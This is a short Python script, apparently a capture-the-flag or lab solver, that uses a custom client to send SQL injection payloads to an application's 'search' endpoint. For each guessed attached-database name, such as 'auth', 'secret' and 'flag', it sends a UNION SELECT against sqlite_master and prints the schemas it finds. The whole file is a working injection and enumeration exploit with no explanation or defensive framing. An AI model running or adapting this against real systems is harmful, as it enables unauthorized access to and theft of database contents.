from client import GhostClient

c = GhostClient()
c.bootstrap()

db_names = [
    "main", "temp", "aux", "db", "db1", "db2", "auth", "admin", "system",
    "flag", "config", "data", "store", "archive", "legacy", "secret", "user",
    "users", "test", "pcap", "logs", "log", "app", "root"
]

for db in db_names:
    q = f"' UNION SELECT 1, type || ':' || name, sql FROM {db}.sqlite_master--"
    res = c.request("search", {"q": q})
    err = res.get("error") if not res.get("ok") else "OK"
    if res.get("ok"):
        rows = [r for r in res["data"]["rows"] if r["id"] == 1]
        print(f"ATTACHED DB FOUND ({db}): {len(rows)} rows -> {rows}")
    elif "no such struct" not in err and "no such table" not in err and "no such database" not in err:
        print(f"DB {db}: {err}")
